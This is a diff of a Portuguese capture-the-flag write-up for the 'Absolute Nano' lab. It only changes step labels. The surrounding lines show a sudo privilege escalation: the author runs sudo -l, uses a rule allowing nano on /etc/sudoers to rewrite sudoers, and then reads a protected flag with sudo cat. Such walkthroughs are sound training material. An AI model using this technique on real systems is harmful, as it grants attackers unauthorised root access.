@@ -50,7 +50,7 @@ Absolute Nano is a short Linux privilege escalation challenge. The unprivileged 
 
 Defina os dados da sua instância uma única vez. Na minha era `chatelaine.cylabacademy.net`, porta `28581`. Use os valores que a plataforma mostrar para você (mudam a cada instância).
 
-***INSERIR no terminal — Kali (atacante)
+***INSERIR no terminal: Kali (atacante)
 
 ```bash
 export TARGET_HOST=chatelaine.cylabacademy.net TARGET_PORT=28581
@@ -58,7 +58,7 @@ export TARGET_HOST=chatelaine.cylabacademy.net TARGET_PORT=28581
 
 Gravei a sessão com `script` para ter o log depois (o `-a` acrescenta ao arquivo em vez de sobrescrever; `exit` encerra a gravação):
 
-***INSERIR no terminal — Kali (atacante)
+***INSERIR no terminal: Kali (atacante)
 
 ```bash
 script -a sessao-terminal-absolute-nano.log
@@ -70,7 +70,7 @@ script -a sessao-terminal-absolute-nano.log
 
 Conecto com o usuário fornecido. O `-p` escolhe a porta SSH não padrão da instância.
 
-***INSERIR no terminal — Kali (atacante)
+***INSERIR no terminal: Kali (atacante)
 
 ```bash
 ssh -p $TARGET_PORT ctf-player@$TARGET_HOST
@@ -83,7 +83,7 @@ Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 7.0.0-1014-aws x86_64)
 
 A flag está ali, no home:
 
-***INSERIR no terminal — shell no alvo como ctf-player
+***INSERIR no terminal: shell no alvo como ctf-player
 
 ```bash
 ls
@@ -95,7 +95,7 @@ flag.txt
 
 **Isso não funcionou** (pule ao replicar): o meu usuário não pode lê-la.
 
-***INSERIR no terminal — shell no alvo como ctf-player
+***INSERIR no terminal: shell no alvo como ctf-player
 
 ```bash
 cat flag.txt
@@ -107,7 +107,7 @@ cat: flag.txt: Permission denied
 
 **Isso também não funcionou** (pule ao replicar): o enunciado fala em "complete power with nano", então testei o óbvio, abrir a flag no Nano.
 
-***INSERIR no terminal — shell no alvo como ctf-player
+***INSERIR no terminal: shell no alvo como ctf-player
 
 ```bash
 nano flag.txt
@@ -123,7 +123,7 @@ Esse teste negativo é útil: o Nano rodando **como eu** tem exatamente as minha
 
 A pergunta passa a ser: o que posso executar com privilégio? A primeira checagem de privesc em Linux é o `sudo -l`, que lista as regras sudo do usuário atual.
 
-***INSERIR no terminal — shell no alvo como ctf-player
+***INSERIR no terminal: shell no alvo como ctf-player
 
 ```bash
 sudo -l
@@ -154,7 +154,7 @@ Parece restrito, mas o argumento é o próprio `/etc/sudoers`, o arquivo que o s
 
 Rodo exatamente o comando autorizado. Ele precisa ser idêntico ao da regra: caminho completo `/bin/nano` e argumento `/etc/sudoers`.
 
-***INSERIR no terminal — shell no alvo como ctf-player
+***INSERIR no terminal: shell no alvo como ctf-player
 
 ```bash
 sudo /bin/nano /etc/sudoers
@@ -185,7 +185,7 @@ Salvo com `Ctrl+O`, confirmo o nome `/etc/sudoers` com `Enter` e saio com `Ctrl+
 
 Se a edição funcionou, agora posso rodar com sudo um comando que **não** estava na regra original. `cat` é o teste perfeito: ele prova que a regra foi ampliada e lê a flag ao mesmo tempo.
 
-***INSERIR no terminal — shell no alvo como ctf-player
+***INSERIR no terminal: shell no alvo como ctf-player
 
 ```bash
 sudo cat /home/ctf-player/flag.txt
